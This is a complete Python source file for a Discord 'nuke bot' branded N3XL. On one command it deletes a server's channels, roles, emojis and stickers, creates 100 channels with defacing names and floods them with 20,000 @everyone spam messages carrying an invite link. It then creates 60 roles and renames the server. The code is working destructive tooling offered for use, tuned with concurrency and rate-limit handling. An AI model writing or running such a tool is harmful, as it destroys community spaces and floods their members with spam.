import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# --- CONFIGURE THESE ---
BOT_TOKEN = os.getenv("TOKEN", "PUT YOUR BOT TOKEN HERE!")
PREFIX = "."

# Channel names (fancy variants)
RANDOM_CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]
USE_RANDOM_NAMES = True
CHANNEL_NAME = "nuked"

# New message content with image
MESSAGE = """# NUKED BY N3XL 
N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
https://discord.gg/pbtxaTf8Q4
https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
||@everyone|| ||@here||"""

AMOUNT_OF_CHANNELS = 100
MESSAGES_PER_CHANNEL = 200   # 200 messages per channel
AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL

# Roles to create (base names, will be cycled to make 60 total)
BASE_ROLE_NAMES = [
    "tamed by N3XL",
    "n̾x̾l̾ o̾n̾ t̾o̾p̾",
    "N̶X̶L̶ O̶N̶ T̶O̶P̶",
    "₦ɆӾɆⱠ"
]
AMOUNT_OF_ROLES = 60

# New server name
NEW_SERVER_NAME = "TAMED BY N3XL"

# -----------------------
# DO NOT MODIFY BELOW
# -----------------------

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def run_concurrent(tasks, limit=50):
    sem = asyncio.Semaphore(limit)
    async def bounded(task):
        async with sem:
            return await task
    return await asyncio.gather(*(bounded(t) for t in tasks), return_exceptions=True)

async def delete_emojis(guild):
    emojis = list(guild.emojis)
    if not emojis:
        return
    print(f"Deleting {len(emojis)} emojis...")
    tasks = [emoji.delete() for emoji in emojis]
    await run_concurrent(tasks, 20)
    print("Emojis deleted.")

async def delete_stickers(guild):
    stickers = list(guild.stickers)
    if not stickers:
        return
    print(f"Deleting {len(stickers)} stickers...")
    tasks = [sticker.delete() for sticker in stickers]
    await run_concurrent(tasks, 20)
    print("Stickers deleted.")

async def delete_roles(guild):
    roles = [r for r in guild.roles if r.name != "@everyone"]
    bot_member = guild.me
    bot_top_role = bot_member.top_role
    deletable = []
    for r in roles:
        if r >= bot_top_role:
            print(f"Skipping role {r.name} (higher than bot)")
            continue
        deletable.append(r)
    if not deletable:
        return
    print(f"Deleting {len(deletable)} roles...")
    tasks = [role.delete() for role in deletable]
    await run_concurrent(tasks, 20)
    print("Roles deleted.")

async def create_60_roles(guild):
    print(f"Creating {AMOUNT_OF_ROLES} roles (cycling through base names)...")
    tasks = []
    for i in range(AMOUNT_OF_ROLES):
        base_name = BASE_ROLE_NAMES[i % len(BASE_ROLE_NAMES)]
        role_name = f"{base_name} {i+1}"
        tasks.append(guild.create_role(name=role_name, reason="Nuked by N3XEL"))
    results = await run_concurrent(tasks, 20)
    created = [r for r in results if isinstance(r, discord.Role)]
    print(f"Created {len(created)} roles.")
    return created

async def rename_server(guild):
    """Rename server with retry and delay"""
    await asyncio.sleep(5)  # wait a bit after all operations
    try:
        await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
        print(f"✅ Renamed server to {NEW_SERVER_NAME}")
    except discord.Forbidden:
        print("❌ Failed to rename: Bot lacks 'Manage Server' permission. Grant it and re-run .nuke")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"Rate limited on rename, waiting {e.retry_after}s...")
            await asyncio.sleep(e.retry_after)
            try:
                await guild.edit(name=NEW_SERVER_NAME)
                print(f"✅ Renamed server on retry to {NEW_SERVER_NAME}")
            except Exception as retry_err:
                print(f"Retry failed: {retry_err}")
        else:
            print(f"Failed to rename server: {e}")

async def send_messages_fast(channels, message, total):
    if not channels:
        return
    semaphore = asyncio.Semaphore(100)  # increased concurrency for 20000 messages
    async def send_one(channel):
        async with semaphore:
            try:
                await channel.send(message)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after)
                    await channel.send(message)
            except Exception:
                pass
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_one(channel))
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete emojis, stickers, roles
    await delete_emojis(guild)
    await delete_stickers(guild)
    await delete_roles(guild)

    # Step 2: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 3: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_one():
        return await guild.create_text_channel(get_channel_name())
    channels = await asyncio.gather(
        *(create_one() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    print(f"Created {len(text_channels)} channels.")

    # Step 4: Send messages (200 per channel)
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    # Step 5: Create 60 roles
    await create_60_roles(guild)

    # Step 6: Rename server (with retry and delay)
    await rename_server(guild)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    # Double-check bot permissions
    me = ctx.guild.me
    if not me.guild_permissions.manage_guild:
        await ctx.send("ang pogi ko")
    await ctx.send("eto na putangina")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} variants`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message Preview: `{MESSAGE[:60]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
👑 New Roles: `{AMOUNT_OF_ROLES} roles (from {', '.join(BASE_ROLE_NAMES)})`
🏷️ New Server Name: `{NEW_SERVER_NAME}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    if BOT_TOKEN == "PUT YOUR BOT TOKEN HERE!" and not os.getenv("TOKEN"):
        print("❌ Please set your TOKEN environment variable.")
        exit(1)
    print("Starting Nuke Bot...")
    print("=" * 50)
    bot.run(BOT_TOKEN) 
